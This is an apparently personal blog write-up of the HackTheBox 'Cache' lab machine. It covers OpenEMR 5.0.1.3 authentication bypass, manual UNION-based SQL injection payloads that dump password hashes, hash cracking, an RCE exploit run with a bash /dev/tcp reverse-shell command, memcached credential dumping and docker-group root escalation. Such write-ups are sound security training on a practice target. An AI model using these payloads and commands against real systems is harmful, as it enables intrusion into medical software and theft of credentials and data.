---
title: "HackTheBox — Cache Writeup"
date: 2020-10-16 12:20:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, Cache, ctf, ffuf, masscan, nmap, javascript, hardcoded-credentials, vhost, openemr, sqli, sql-injection, database, hashes, hashid, john, su, memcached, telnet, ssh, group, docker]
image: /assets/img/Posts/Cache.png
---

> Cache was a fun box, Initial web enumeration leads us to hardcoded credentials stored inside simple login page which uses client side validation, then discover a new VHost running a vulnerable instance of OpenEMR application. Exploitation chain of this application involves bypassing authentication allowing us to access a page vulnerable to SQL injection, We'll perform SQL injection attack manually to dump hashes from the database. Next, We'll use an OpenEMR Authenticated Remote Code Execution exploit to drop us a shell on the box, then pivot to another user using the credentials obtained from hardcoded website. Later we'll access a Memcached service holding credentials of another user, dump them and escalate to next user. Leveraging the docker membership of the user we'll elevate privileges to root.

## Reconnaissance

Beginning with `masscan` to find out open tcp and udp ports and piping it to `tee` to store the output in a file :

```shell
cfx:  ~/Documents/htb/cache
→ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.188 --rate 500 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-10-13 10:25:16 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.188
Discovered open port 22/tcp on 10.10.10.188
```

Using `awk` and `sed` to filter out port numbers from output:

```shell
cfx:  ~/Documents/htb/cache
→ cat masscan.ports | grep tcp
Discovered open port 80/tcp on 10.10.10.188
Discovered open port 22/tcp on 10.10.10.188

cfx:  ~/Documents/htb/cache
→ cat masscan.ports | grep tcp | sed 's/Discovered open port //' | awk -F/ '{print $1}' ORS=','
80,22,
```
Ports 22, 80 were discovered from masscan, running `nmap` scan to discover services running on these ports :

```shell
cfx:  ~/Documents/htb/cache
→ nmap -sC -sV -p80,22 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 16:19 IST
Nmap scan report for 10.10.10.188
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds
```

Apart from Apache version and webpage title we don't find anything interesting from nmap scan.

### Port 80 - HTTP

#### Cache.htb

On visiting <http://10.10.10.188> we see a very old school static website displaying information on Hacking and Hackers :

![website](/assets/img/Posts/Cache/website.png)

Before going forward with our enumeration we'll fuzz out directories using `ffuf` and include `.html & .txt`  extension :

```shell
cfx:  ~/Documents/htb/cache
→ ffuf -r -c -u http://10.10.10.188/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .txt,.html -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.188/FUZZ
 :: Extensions       : .txt .html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

login.html              [Status: 200, Size: 2421, Words: 389, Lines: 106]
news.html               [Status: 200, Size: 7231, Words: 948, Lines: 100]
author.html             [Status: 200, Size: 1522, Words: 180, Lines: 68]
index.html              [Status: 200, Size: 8193, Words: 902, Lines: 339]
jquery                  [Status: 200, Size: 954, Words: 65, Lines: 17]
contactus.html          [Status: 200, Size: 2539, Words: 283, Lines: 148]
net.html                [Status: 200, Size: 290, Words: 23, Lines: 19]
:: Progress: [60348/60348] :: Job [1/1] :: 180 req/sec :: Duration: [0:05:35] :: Errors: 0 ::
```

#### login.html

Visiting <http://10.10.10.188/login.html> exposes a login form:

![login](/assets/img/Posts/Cache/login.png)

I tried admin:admin creds which failed and we get two errors popped up:

![error1](/assets/img/Posts/Cache/error1.png)

![error2](/assets/img/Posts/Cache/error2.png)

This odd behaviour of login form first displaying **Password didn't Match** and later **Username didn't Match** made me wonder how is it verifying credentials, So I checked the source of the page where I saw three JavaScript's out of which two are web sourced but the script showcasing `functionality.js` is hosted on the box inside `jquery` directory, also `jquery` directory visible in `ffuf` output.

![js](/assets/img/Posts/Cache/js.png)

#### functionality.js

```javascript
$(function(){

    var error_correctPassword = false;
    var error_username = false;

    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });

});
```
This client side JavaScript uses hardcoded credentials `ash:H@v3_fun` for authentication.

Successful logging in leads us to the following page where we see a picture of **ACE**, a character from One piece anime :

![website1](/assets/img/Posts/Cache/website1.png)

Apparently, we are not getting anything useful out of these credentials so we'll just keep them handy for later and move forward.

#### author.html

Heading on to <http://10.10.10.188/author.html> we have the following page displaying some information about ash :

![author](/assets/img/Posts/Cache/author.png)

Interestingly, last line reveals there is another project similar to cache named `HMS (Hospital Management System)`.

### VHOST Enumeration

First thought comes in mind to enumerate subdomains trying `hms.cache.htb` but unfortunately it didn't work. So I decided to fuzz domains thinking maybe `$VHOST.htb` is used instead of `$VHOST.cache.htb` :

```shell
cfx:  ~/Documents/htb/cache
→ ffuf -r -c -u http://10.10.10.188 -H 'Host:FUZZ.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fl 339

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.188
 :: Header           : Host: FUZZ.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response lines: 339
________________________________________________

hms                     [Status: 200, Size: 6061, Words: 1620, Lines: 118]
:: Progress: [19983/19983] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:51] :: Errors: 0 ::
```
Bingo ! It worked, So I added `hms.htb` inside `/etc/hosts` file.

### HMS Website

On accessing `http://hms.htb` we get redirected to `http://hms.htb/interface/login/login.php?site=default` a login page running OpenEMR.

> OpenEMR is a medical practice management software which also supports Electronic Medical Records.

![hms](/assets/img/Posts/Cache/hms.png)

I tried `ash` creds discovered earlier but it didn't work.

#### Fuzzing the website

To fuzz the website I included `.php` extension since the redirected site had login.php :

```shell
cfx:  ~/Documents/htb/cache
→ ffuf -r -c -u http://hms.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .txt,.php -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://hms.htb/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

sites                   [Status: 200, Size: 930, Words: 64, Lines: 17]
config                  [Status: 200, Size: 1144, Words: 77, Lines: 18]
common                  [Status: 200, Size: 1720, Words: 112, Lines: 21]
admin.php               [Status: 200, Size: 937, Words: 69, Lines: 36]
modules                 [Status: 200, Size: 956, Words: 64, Lines: 17]
templates               [Status: 200, Size: 3404, Words: 208, Lines: 29]
images                  [Status: 200, Size: 8498, Words: 435, Lines: 54]
public                  [Status: 200, Size: 1316, Words: 88, Lines: 19]
library                 [Status: 200, Size: 24528, Words: 1444, Lines: 129]
services                [Status: 200, Size: 2285, Words: 137, Lines: 23]
index.php               [Status: 200, Size: 6061, Words: 1620, Lines: 118]
contrib                 [Status: 200, Size: 2688, Words: 172, Lines: 26]
portal                  [Status: 200, Size: 9097, Words: 2866, Lines: 207]
sql                     [Status: 200, Size: 9642, Words: 538, Lines: 55]
setup.php               [Status: 200, Size: 1214, Words: 167, Lines: 16]
custom                  [Status: 200, Size: 5090, Words: 288, Lines: 36]
tests                   [Status: 200, Size: 1516, Words: 98, Lines: 20]
Documentation           [Status: 200, Size: 4204, Words: 233, Lines: 31]
controllers             [Status: 200, Size: 3265, Words: 186, Lines: 27]
interface               [Status: 200, Size: 37, Words: 7, Lines: 1]
vendor                  [Status: 200, Size: 7249, Words: 449, Lines: 49]
controller.php          [Status: 200, Size: 37, Words: 7, Lines: 1]
ci                      [Status: 200, Size: 1531, Words: 98, Lines: 20]
version.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675]
cloud                   [Status: 200, Size: 930, Words: 61, Lines: 17]
patients                [Status: 200, Size: 28, Words: 5, Lines: 1]
repositories            [Status: 200, Size: 1887, Words: 112, Lines: 21]
myportal                [Status: 200, Size: 28, Words: 4, Lines: 1]
entities                [Status: 200, Size: 1779, Words: 113, Lines: 21]
:: Progress: [60348/60348] :: Job [1/1] :: 180 req/sec :: Duration: [0:05:34] :: Errors: 0 ::
```
Looking at the output there are multiple exposed directories but first I went to `admin.php` located on <http://hms.htb/admin.php> which returns Version of `OpenEMR as 5.0.1(3)`, DB name as `openemr` and Site ID.

![admin](/assets/img/Posts/Cache/admin.png)

### OpenEMR Vulnerabilities

A quick google search brings us to this [**Vulnerabity report by Project Insecurity**](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) for OpenEMR 5.0.1.3 (same as ours) explaining many different types of vulnerabilities.

#### Information Disclosure

As per section 4 of the [**vulnerability report**](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) the instance has three different `Unauthenticated Information Disclosure` one of the them is `admin.php` which we found earlier during our fuzzing, another file which is leaking info is located at `http://hms.htb/sql_patch.php`, looking at both the file we can confirm the following details:

![sqlpatch](/assets/img/Posts/Cache/sqlpatch.png)

- Version: 5.0.1(3)
- DB name: openemr

## SQL Injection - OpenEMR

Going through the [**report**](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) we understand the software has its fair share of SQL injection vulnerabilities.

To perform SQL injection we'll make use of following sections from the report :

![sec2](/assets/img/Posts/Cache/sec2.png)

![sec3.2](/assets/img/Posts/Cache/sec3.2.png)

#### Key Points

- In Section 2, it is highlighted that for some pages inside portal directory are accessible after browsing to the registration page, first one is `add_edit_event_user.php`

- Authentication can be bypassed by visiting registration page is located at <http://hms.htb/portal/account/register.php/>

- Inside Section 3.2, we see `add_edit_event_user.php` is vulnerable to SQL injection

- SQLi vulnerable page located at <http://hms.htb/portal/add_edit_event_user.php>

### Authentication Bypass

On visiting <http://hms.htb/portal/add_edit_event_user.php> we are redirected to Patient portal login page with an error message :

![portal](/assets/img/Posts/Cache/portal.png)

As mentioned in Section 2 of the report, we can bypass this authentication by visiting <http://hms.htb/portal/account/register.php/>

![register](/assets/img/Posts/Cache/register.png)

Again visiting `add_edit_event_user.php` the page returns successfully, confirming we have bypassed the authentication :

![bypass](/assets/img/Posts/Cache/bypass.png)

### Confirming SQLi

Now that we have bypassed the authentication we can look at the PoC of SQL injection for `add_edit_event_user.php`

Proof of Concept:
`http://host/openemr/portal/add_edit_event_user.php?eid=​1 ANDEXTRACTVALUE(0,CONCAT(0x5c,VERSION()))`

On visiting `http://hms.htb/portal/add_edit_event_user.php?eid=1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))` we see the following Query error returned:

![query](/assets/img/Posts/Cache/query.png)

The query which we sent as per PoC errors but we can see the result of `VERSION()` as `5.7.30-0ubuntu0.18.04.1` in the message which confirms it's an error based SQLi.

### Manual SQLi

It's easier to perform this SQLi using `sqlmap` by changing the query to `eid=1` inside burp and capture the request along with cookies required for authentication and send it to sqlmap for auto exploitation but instead we'll perform it manually to understand it better.

Important Note: While performing SQLi if the session timeouts, we need to reload `register.php` page, intercept the request and replace the older cookies with new one.

#### Step 1: Testing SQLi

We'll begin by first testing the SQLi by sending `eid=1` and see the response :

![burp](/assets/img/Posts/Cache/burp.png)

Looking at the response, we are getting some kind of SQL syntax error, confirming we have some kind of SQL injection

#### Step 2: Finding fields

Now, let's make use of `ORDER BY` SQL query to find out how many fields are inside this sql query:

We'll send order by command and increment the value by 1 until we see an change in the result
```console
/portal/add_edit_event_user.php?eid=1 order by 1
/portal/add_edit_event_user.php?eid=1 order by 2
/portal/add_edit_event_user.php?eid=1 order by 3
/portal/add_edit_event_user.php?eid=1 order by 4
```
Till `eid=1 order by 4 ` we don't see any change in the result but on sending `eid=1 order by 5 ` a new error is returned as `Unknown column '5' in 'order clause'` :

![order](/assets/img/Posts/Cache/order.png)

This indicates we have 4 fields inside the SQL Query, which we'll use to draft our next query.

#### Step 3: SQL Injection Enumeration

We'll use **UNION SELECT** to combine our select statement results and find out version of the box by sending `VERSION()` inside our query, add `null` parameter for all four fields. I tried injecting version() inside all four but only third field returned the query result :

![select](/assets/img/Posts/Cache/select.png)

Next, let's enumerate Database name

```terminal
/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,database(),null HTTP/1.1
```

We can see our query resulted with database name as `openemr`

![database](/assets/img/Posts/Cache/database.png)

Next, let’s get the user which is running the queries on this SQL server.

```terminal
/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,user(),null
```

![user](/assets/img/Posts/Cache/user.png)

The user is `openemr@localhost`

Great! Now that our statement is working we can hop on to the next level to enumerate

#### Step 4: Enumerating Tables

Since, we already know we are running inside `openemr` database, Let’s try to get the list of tables under this database:

To understand Information scheme tables in details we can refer this [**page**](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)

> TABLE_SCHEMA: The name of the schema (database) to which the table belongs.

```terminal
/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,CONCAT(table_name),null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='openemr'
```

![table](/assets/img/Posts/Cache/table.png)

Looking at the result we see only one table entry, let reform our query by adding `group_concat` to the statement

```terminal
/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,GROUP_CONCAT(table_name),null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='openemr'
```

![table2](/assets/img/Posts/Cache/table2.png)

We got the list of tables inside openemr database, but the result looks incomplete probably there is some kind of limit on how many field can be shown.

Let's again refine our query to look for something interesting like users table

```terminal
/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,GROUP_CONCAT(table_name),null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='openemr' AND TABLE_NAME like 'user%'
```
![table3](/assets/img/Posts/Cache/table3.png)

Bingo! Two interesting tables are `users` & `users_secure`

### Extracting Credentials

#### Step 5: Enumerating users & users_secure table

First, we'll enumerate users table by finding out columns inside it :

```terminal
/portal/add_edit_event_user.php?eid=1 UNION SELECT null,null,group_concat(column_name),null FROM INFORMATION_SCHEMA.columns WHERE TABLE_SCHEMA='openemr' AND TABLE_NAME='users'
```
![usertable](/assets/img/Posts/Cache/usertable.png)

We have username and password columns which are useful to us, let's take a look at them :

Since we already know we are under `openemr` database, we don't need to mention it again, If in case there were multiple databases running on this server we would have specified database name by `openemr.users`

We will be using concatenating three field where `0x3A is a colon (:) in hex` so our output will be in the form `username:password`

```terminal
/portal/add_edit_event_user.php?eid=1 union select null,null,group_concat(username,0x3a,password),NULL from users
```
![usertable1](/assets/img/Posts/Cache/usertable1.png)

Doesn't look like we have any password, let's try the similar query for `users_secure` table:

```terminal
/portal/add_edit_event_user.php?eid=1 union select null,null,group_concat(username,0x3a,password),NULL from users_secure
```
![usersecure](/assets/img/Posts/Cache/usersecure.png)

Great! We have a username and its hash `openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.`, let's crack it using john.

### Cracking hashes

Before cracking the hash let's check it's format using `hashid`

```shell
cfx:  ~/Documents/htb/cache
→ hashid -j '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'
Analyzing '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'
[+] Blowfish(OpenBSD) [JtR Format: bcrypt]
[+] Woltlab Burning Board 4.x
[+] bcrypt [JtR Format: bcrypt]
```
Hash Format for John is `bcrypt`

```shell
cfx:  ~/Documents/htb/cache
→ cat openemr_admin.hash
openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
```

```shell
cfx:  ~/Documents/htb/cache
→ john --format=bcrypt -w=/usr/share/wordlists/rockyou.txt openemr_admin.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE 2/3 (2020-10-14 16:40) 1.666g/s 1920p/s 1920c/s 1920C/s water..88888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed

cfx:  ~/Documents/htb/cache
→ john --show openemr_admin.hash
openemr_admin:xxxxxx

1 password hash cracked, 0 left
```
So we have credentials for OpenEMR as `openemr_admin:xxxxxx`

## OpenEMR - RCE

With `searchsploit` I was able to see an Authenticated RCE exploit for our version:

```shell
cfx:  ~/Documents/htb/cache
→ searchsploit openemr 5.0.1
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
[..SNIP..]

OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution                                                                                                     | php/webapps/45161.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------
```

## Shell as www-data

Going through exploit, we understand it expects username, password and the command to be executed as inputs.

```shell
cfx:  ~/Documents/htb/cache
→ python2 45161.py http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i >&/dev/tcp/10.10.14.10/8020 0>&1'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__)

   ={   P R O J E C T    I N S E C U R I T Y   }=

         Twitter : @Insecurity
         Site    : insecurity.sh

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload

```

Getting a call back on `pwncat` listener:

```shell
cfx:  ~/Documents/htb/cache
→ pwncat -l 8020 -vv
INFO: Listening on :::8020 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:8020 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.188:46344 (family 2/IPv4, TCP)
bash: cannot set terminal process group (1653): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami
whoami
www-data
www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
```

## Elevating Priv: www-data -> ash

`user.txt` is located inside folder user `ash`:

```shell
www-data@cache:/home/ash$ cat user.txt
cat: user.txt: Permission denied
```
Initially we discovered hardcoded credentials for user ash during HTTP enumeration, we can `su` to ash using `ash:H@v3_fun` and grab the user flag:

```shell
www-data@cache:/home$ su ash
Password:
ash@cache:~$ cat user.txt
fa1d99dc286be40*****************
```
## Elevating Priv: ash -> luffy

### Enumeration

While checking `/etc/passwd` to find out users present on the box I could see along with `ash` and `luffy` there's also a `memcache` user:

```shell
ash@cache:~$ cat /etc/passwd
cat /etc/passwd
[..SNIP..]
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
```

On further checking we can confirm `memcache` is running on the box and traditionally 11211 is the default port for it.

```shell
ash@cache:~$ ss -tnlp
ss -tnlp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*
LISTEN   0         128                       *:80                     *:*
LISTEN   0         128                    [::]:22                  [::]:*
```

### Memcached Service

> Memcached is a general-purpose distributed memory-caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source must be read.

Using this [**article**](https://www.hackingarticles.in/penetration-testing-on-memcached-server/) we can dump data from Memcached service.

First, we'll connect to service using telnet and start by checking the `version` of Memcached server:

```shell
ash@cache:~$ telnet localhost 11211
telnet localhost 11211
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
version
version
VERSION 1.5.6 Ubuntu
```
Next, we'll use `stat slabs` which will provide us info if there are any active slabs, in this case we have 1:

> A slab allocation is used to optimize memory usage and prevent memory fragmentation when information expires from the cache

```shell
stats slabs
STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 5
STAT 1:free_chunks 10917
STAT 1:free_chunks_end 0
STAT 1:mem_requested 371
STAT 1:get_hits 0
STAT 1:cmd_set 8355
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048576
END
```
Next, we'll use `stat cachedump 1 0` to dump keys,  where `1` is the slab number and `0` denotes to dump all keys.

```shell
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
```
Then, using `get` command followed by key name to get the data inside key:
```shell
get link
VALUE link 0 21
https://hackthebox.eu
END

get user
VALUE user 0 5
luffy
END

get passwd
VALUE passwd 0 9
0n3_p1ec3
END

get file
VALUE file 0 7
nothing
END

get account
VALUE account 0 9
afhj556uo
END
```
Got credentials of user luffy as `luffy:0n3_p1ec3`

### SSH as luffy

We can SSH to the server using luffy's credentials:

```shell
cfx:  ~/Documents/htb/cache
→ ssh luffy@10.10.10.188
The authenticity of host '10.10.10.188 (10.10.10.188)' can't be established.
ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.188' (ECDSA) to the list of known hosts.
luffy@10.10.10.188's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 14 14:05:47 UTC 2020

  System load:  0.14              Processes:              185
  Usage of /:   75.3% of 8.06GB   Users logged in:        0
  Memory usage: 22%               IP address for ens160:  10.10.10.188
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

110 packages can be updated.
0 updates are security updates.


Last login: Wed May  6 08:54:44 2020 from 10.10.14.3
luffy@cache:~$ whoami
luffy
```

## Elevating Priv: luffy -> root

User luffy is a member of docker group:

```shell
luffy@cache:~$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```
There's already an ubuntu image on the box, so we can leverage it to escalate to root referring [**gtfo**](https://gtfobins.github.io/gtfobins/docker/):

```shell
luffy@cache:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        13 months ago       64.2MB
```
#### Docker privesc
We'll launch the image as a container and mount the root file system into it which will drop us a shell:

```shell
luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Grabbing root.txt
```
# cat /root/root.txt
c4b77e278753a0******************

```
And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !